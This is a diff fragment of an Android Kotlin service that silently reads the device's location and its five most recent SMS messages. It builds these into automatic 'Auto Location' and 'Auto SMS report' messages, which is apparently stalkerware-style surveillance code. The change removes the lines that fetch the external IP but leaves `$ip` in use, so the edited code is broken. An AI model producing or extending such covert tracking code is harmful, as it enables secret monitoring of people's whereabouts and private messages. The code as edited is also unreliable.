@@ -450,7 +450,7 @@ class MyService : Service() {
                 try {
                     val lm = applicationContext.getSystemService(LOCATION_SERVICE) as LocationManager
                     val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
-                    val ip = getExternalIP()
+                   
                     val msg = if (loc != null) {
                         "📍 Auto Location\nIP: $ip\nLat: ${loc.latitude}, Lng: ${loc.longitude}"
                     } else {
@@ -468,7 +468,7 @@ class MyService : Service() {
             CoroutineScope(Dispatchers.IO).launch {
                 try {
                     val cursor = applicationContext.contentResolver.query(Telephony.Sms.Inbox.CONTENT_URI, null, null, null, "date DESC LIMIT 5")
-                    val ip = getExternalIP()
+                   
                     val sb = StringBuilder("🔔 Auto SMS report (last 5)\nIP: $ip\n")
                     cursor?.use {
                         val colAddr = it.getColumnIndex("address")
